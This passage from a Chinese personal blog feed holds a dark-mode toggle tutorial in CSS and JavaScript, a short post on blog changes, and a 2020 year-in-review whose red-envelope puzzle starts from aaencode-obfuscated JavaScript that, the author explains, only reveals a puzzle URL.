class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full 